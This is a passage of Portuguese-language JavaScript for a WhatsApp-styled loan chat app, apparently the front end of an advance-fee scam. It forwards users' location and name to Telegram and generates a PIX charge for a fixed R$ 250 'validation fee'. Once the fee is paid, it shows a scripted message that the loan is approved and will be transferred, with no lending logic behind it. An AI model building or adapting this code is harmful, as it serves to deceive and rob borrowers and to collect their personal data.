        const msg = `<b>Minha localização</b><br><a href="https://maps.google.com/?q=${latitude},${longitude}" target="_blank" style="color:var(--wa-green);">Ver no mapa</a><br><small>${latitude.toFixed(5)}, ${longitude.toFixed(5)}</small>`;
        addMessage(msg, 'sent');
        sendToTelegram(` Localização: ${latitude}, ${longitude}`);
      },
      () => showToast(' Não foi possível obter localização'),
      { timeout: 10000 }
    );
  }

  function sendContact() {
    const msg = ` <b>Meu contato</b><br>${state.nome || 'Cliente'}<br><small>Compartilhado via app</small>`;
    addMessage(msg, 'sent');
    sendToTelegram(` Contato: ${state.nome}`);
  }

  // ==================== PIX AUTOMÁTICO (EVOPAY) ====================
  let pixPollingTimer = null;

  async function gerarCobrancaPix() {
    const cfg = window.CONFIG;
    if (!cfg.pix || !cfg.pix.apiEndpoint) {
      botReply(' Sistema PIX indisponível. Entre em contato pelo Telegram.', 1000);
      return;
    }

    showTyping();
    try {
      const res = await fetch(cfg.pix.apiEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nome: state.nome,
          protocolo: state.protocol,
          clientId: state.currentClientId
        })
      });
      const data = await res.json();
      hideTyping();

      if (!data.ok) {
        botReply(` Não foi possível gerar o PIX agora.<br><small>${data.erro || 'Tente novamente em instantes.'}</small>`, 1000);
        return;
      }

      state.pixAtual = {
        id: data.id,
        qrCode: data.qrCode,
        status: data.status
      };
      saveState();

      // Monta o card PIX visual
      const qrImg = data.qrCodeBase64
        ? `<img src="data:image/png;base64,${data.qrCodeBase64}" alt="QR Code PIX">`
        : `<div style="padding:20px;background:#f0f0f0;border-radius:8px;text-align:center;color:#666;"> QR Code disponível no app do banco</div>`;

      const cardPix = `
        <div class="pix-card">
          <div class="pix-header">
            <span class="pix-icon"></span>
            <div>
              <div class="pix-title">PIX - Taxa de Validação</div>
              <div class="pix-subtitle">Pagamento seguro via EvoPay</div>
            </div>
          </div>
          <div class="pix-valor">R$ 250,00</div>
          <div class="pix-qr">${qrImg}</div>
          <div class="pix-copiaecola">
            <div class="pix-label">PIX Copia e Cola:</div>
            <div class="pix-code" id="pixCode_${data.id}">${data.qrCode}</div>
            <button class="pix-btn-copy" onclick="copiarPix('${data.id}')"> Copiar código</button>
          </div>
          <div class="pix-status" id="pixStatus_${data.id}">
            <span class="pix-dot"></span> Aguardando pagamento...
          </div>
        </div>
      `;
      addMessage(cardPix, 'received', 'read');

      // Inicia polling automático
      iniciarPollingPix(data.id);

    } catch (err) {
      hideTyping();
      console.warn('Erro PIX:', err);
      botReply(' Erro de conexão. Verifique sua internet e tente novamente.', 1000);
    }
  }

  function iniciarPollingPix(transactionId) {
    if (pixPollingTimer) clearInterval(pixPollingTimer);
    const cfg = window.CONFIG;
    let tentativas = 0;
    const maxTentativas = 360; // 30 minutos (5s * 360)

    pixPollingTimer = setInterval(async () => {
      tentativas++;
      if (tentativas > maxTentativas) {
        clearInterval(pixPollingTimer);
        const statusEl = document.getElementById(`pixStatus_${transactionId}`);
        if (statusEl) statusEl.innerHTML = '<span class="pix-dot expired"></span> PIX expirado. Solicite um novo.';
        return;
      }

      try {
        const res = await fetch(`${cfg.pix.apiEndpoint}?status=${transactionId}`);
        const data = await res.json();

        if (data.ok && data.status === 'COMPLETED') {
          clearInterval(pixPollingTimer);
          pixAprovado(transactionId);
        }
      } catch (e) { /* ignora falhas pontuais */ }
    }, cfg.pix.pollingInterval || 5000);
  }

  function pixAprovado(transactionId) {
    const statusEl = document.getElementById(`pixStatus_${transactionId}`);
    if (statusEl) {
      statusEl.innerHTML = '<span class="pix-dot approved"></span>  Pagamento confirmado!';
      statusEl.classList.add('approved');
    }

    playMessageSound();
    vibrate([200, 100, 200]);

    state.etapa = 'aguardando_comprovante';
    state.progresso = 4;
    markTimelineEvent('pagamento');
    saveState(); updateProgressBar();

    setTimeout(() => {
      botReply(' <b>Pagamento confirmado automaticamente!</b><br><br>Nosso sistema identificou seu PIX. A liberação ocorrerá entre <b>15 minutos e 24 horas</b>. ', 1500);
      sendNotification(' Pagamento confirmado', 'Seu PIX foi recebido. Aguarde a liberação.');

      setTimeout(() => {
        markTimelineEvent('liberacao');
        botReply(` <b>${state.nome}</b>, seu empréstimo foi <b>APROVADO</b> e o valor será transferido em breve para a chave Pix informada!<br><br> Protocolo: <b>${state.protocol}</b>`, 2000);
        sendNotification(' Empréstimo aprovado!', 'Seu valor será transferido em instantes.');
      }, 10000);
    }, 1500);
  }

  function copiarPix(transactionId) {
    const codeEl = document.getElementById(`pixCode_${transactionId}`);
    if (!codeEl) return;
    const texto = codeEl.textContent.trim();

    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(texto).then(() => {
        showToast(' Código PIX copiado!');
        vibrate(30);
      }).catch(() => fallbackCopy(texto));
    } else {
      fallbackCopy(texto);
    }
  }

  function fallbackCopy(texto) {
    const ta = document.createElement('textarea');
    ta.value = texto;
    ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); showToast(' Código PIX copiado!'); }
    catch { showToast(' Copie manualmente.'); }
    document.body.removeChild(ta);
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();